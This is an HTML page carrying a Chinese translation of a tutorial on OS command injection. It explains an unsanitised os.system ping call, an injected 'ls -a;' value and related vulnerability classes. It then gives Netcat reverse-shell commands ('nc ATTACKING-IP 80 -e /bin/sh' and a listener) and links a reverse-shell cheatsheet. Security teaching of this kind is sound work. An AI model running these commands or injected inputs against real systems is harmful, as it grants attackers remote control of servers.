<html>
<head>
<title>Command execution: OWASP top vulnerability</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">命令执行:OWASP最大漏洞</h1>
<blockquote>原文：<a href="https://medium.com/nerd-for-tech/command-execution-owasp-top-vulnerability-ad9a85163ab4?source=collection_archive---------21-----------------------#2021-04-25">https://medium.com/nerd-for-tech/command-execution-owasp-top-vulnerability-ad9a85163ab4?source=collection_archive---------21-----------------------#2021-04-25</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/1697d969d1dcc491368a8146d4ca6a5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JYgwaEFfqJre6bhC7u-Qiw.jpeg"/></div></div><figcaption class="iq ir et er es is it bd b be z dx translated"><a class="ae iu" href="https://www.uhdpaper.com/2019/12/green-arrow-dc-4k-42289.html" rel="noopener ugc nofollow" target="_blank"> src </a></figcaption></figure><h1 id="fffc" class="iv iw hi bd ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js bi translated">什么是命令执行？</h1><p id="7085" class="pw-post-body-paragraph jt ju hi jv b jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq hb bi translated">命令注入也称为操作系统命令注入是一种通过获取外壳来利用运行外部操作系统命令的系统应用程序的方法，这可能是由用户输入的不良净化或验证造成的。这可能导致在目标系统上执行任意命令。这也可能导致攻击者破坏整个数据库，其中可能包括用户的个人信息。</p><p id="1189" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">攻击者可以从受损系统中请求、删除、添加、编辑信息(如XML配置文件),甚至可以在系统中注入一个后门，以便以后访问。</p><p id="ff77" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">当开发人员在其源代码中使用system()或等效命令时，发现此漏洞的机会会增加。</p><pre class="kw kx ky kz fd la lb lc ld aw le bi"><span id="04e3" class="lf iw hi lb b fi lg lh l li lj">import os</span><span id="05ad" class="lf iw hi lb b fi lk lh l li lj">domain = user_input() #enter the website to trace<br/>os.system('ping'+ domain) #counts the hops to domain</span></pre><p id="c7eb" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">上面的代码将ping用户输入的域。但是您可能会注意到，用户输入在传递给在系统上执行命令的system()之前没有被过滤。</p><p id="da74" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">那么，如果用户决定输入开发人员不希望输入的内容，例如</p><pre class="kw kx ky kz fd la lb lc ld aw le bi"><span id="1604" class="lf iw hi lb b fi lg lh l li lj">import os</span><span id="ccdf" class="lf iw hi lb b fi lk lh l li lj">domain = user_input() #ls -a;<br/>os.system('ping'+ domain) #counts the hops to domain</span></pre><p id="fbee" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">在这种情况下，域变量将存储命令“ls-a；”，前面的命令以“；”结束允许您输入另一个命令。</p><pre class="kw kx ky kz fd la lb lc ld aw le bi"><span id="c54d" class="lf iw hi lb b fi lg lh l li lj">ls -a ; ping</span></pre><p id="90fc" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">因此，这里系统将执行没有属性的“ls -a”命令和“ping”命令。还可以包含其他命令来代替ls -a。</p><p id="c445" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">但是你可能会想，</p><h1 id="80bd" class="iv iw hi bd ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js bi translated"><strong class="ak">为什么应用程序需要执行系统命令？</strong></h1><p id="d1c7" class="pw-post-body-paragraph jt ju hi jv b jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq hb bi translated">很明显，因为应用程序需要与系统通信以实现其内部功能，或者它可能想要运行其他应用程序，或者可能想要运行用其他编程语言编写的程序。</p><p id="f83e" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">因此，它总结了进行system()调用是多么有用，这是一个非常有用的特性，除非它被合法地使用。</p><h1 id="447b" class="iv iw hi bd ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js bi translated"><strong class="ak">命令注射</strong></h1><p id="9e3e" class="pw-post-body-paragraph jt ju hi jv b jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq hb bi translated">好吧，这对用户来说不是问题，但这会给攻击者带来很多机会，可能发生的最糟糕的事情是攻击者可以产生一个反向外壳并在web服务器(目标系统)上执行命令注入攻击。为了完成这个场景，我们有一大堆反向外壳可以使用，你可以从<a class="ae iu" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" rel="noopener ugc nofollow" target="_blank">这里</a>得到它们。</p><h1 id="26ed" class="iv iw hi bd ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js bi translated"><strong class="ak">方法</strong></h1><p id="dfa6" class="pw-post-body-paragraph jt ju hi jv b jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq hb bi translated">以下是由相同漏洞导致的不同类型的命令注入攻击。</p><h1 id="a835" class="iv iw hi bd ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js bi translated">任意命令注入</h1><p id="8f6d" class="pw-post-body-paragraph jt ju hi jv b jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq hb bi translated">对用户输入的不良净化或验证会导致此漏洞。在这里，攻击者可以向系统注入恶意命令。</p><h1 id="1ce5" class="iv iw hi bd ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js bi translated">任意文件上传</h1><p id="b0f0" class="pw-post-body-paragraph jt ju hi jv b jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq hb bi translated">允许上传文件而不验证文件中的扩展名或数据的网站可能导致利用此漏洞进行攻击，这种类型的攻击可能属于上传恶意代码块的代码注入类别。</p><h1 id="58af" class="iv iw hi bd ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js bi translated">不安全序列化</h1><p id="9727" class="pw-post-body-paragraph jt ju hi jv b jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq hb bi translated">每个通信都需要数据的序列化和反序列化，但是如果数据的反序列化(服务器端)在没有任何适当验证的情况下发生，则可能导致命令执行。</p><h1 id="4f5b" class="iv iw hi bd ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js bi translated">服务器端模板注入(SSTI)</h1><p id="c106" class="pw-post-body-paragraph jt ju hi jv b jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq hb bi translated">该漏洞允许攻击者插入恶意的服务器端模板，许多服务器端应用程序使用该模板来生成有效的HTML响应。</p><h1 id="a7c5" class="iv iw hi bd ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js bi translated">XML外部实体注入(XXE)</h1><p id="4dd9" class="pw-post-body-paragraph jt ju hi jv b jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq hb bi translated">XXE是一个攻击漏洞，它滥用XML解析器/数据的功能。它会导致敏感数据泄露、服务器端请求伪造(SSRF)或拒绝服务攻击。</p><h1 id="6124" class="iv iw hi bd ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js bi translated">攻击</h1><p id="aa2d" class="pw-post-body-paragraph jt ju hi jv b jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq hb bi translated">在本文中，我们将重点讨论Netcat反向shell。</p><p id="68ab" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">反向外壳是从目标机器向处于监听状态的攻击者主机发起的外壳，以拾取外壳。bind shell在目标主机上设置(在本例中是通过注入)了一个特定的端口，该端口将启动与攻击者设备的连接，从而建立连接。反向壳也可以被称为后门(正如它的发音一样)。</p><h2 id="52a3" class="lf iw hi bd ix ll lm ln jb lo lp lq jf ke lr ls jj ki lt lu jn km lv lw jr lx bi translated">步骤:</h2><ol class=""><li id="a9e1" class="ly lz hi jv b jw jx ka kb ke ma ki mb km mc kq md me mf mg bi translated">在攻击者的设备上设置监听器。</li><li id="1272" class="ly lz hi jv b jw mh ka mi ke mj ki mk km ml kq md me mf mg bi translated">从目标设备启动连接。</li><li id="7b99" class="ly lz hi jv b jw mh ka mi ke mj ki mk km ml kq md me mf mg bi translated">发布命令，享受你的反向外壳。</li></ol><p id="4eb2" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">您应该首先设置监听器，如下所示。</p><pre class="kw kx ky kz fd la lb lc ld aw le bi"><span id="0864" class="lf iw hi lb b fi lg lh l li lj">nc -lvp 80</span></pre><p id="9b4b" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">下一步，我们执行以下命令，借助以下命令在目标主机上启动连接。</p><pre class="kw kx ky kz fd la lb lc ld aw le bi"><span id="a8ef" class="lf iw hi lb b fi lg lh l li lj">nc ATTACKING-IP 80 -e /bin/sh</span></pre><p id="362e" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">如果这不起作用</p><pre class="kw kx ky kz fd la lb lc ld aw le bi"><span id="8d98" class="lf iw hi lb b fi lg lh l li lj">/bin/sh | nc ATTACKING-IP 80</span></pre><p id="3ea9" class="pw-post-body-paragraph jt ju hi jv b jw kr jy jz ka ks kc kd ke kt kg kh ki ku kk kl km kv ko kp kq hb bi translated">这里有一整套逆向shell<a class="ae iu" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" rel="noopener ugc nofollow" target="_blank">和</a>，所以不要把自己局限在Netcat上，也要尝试新的shell。</p></div></div>    
</body>
</html>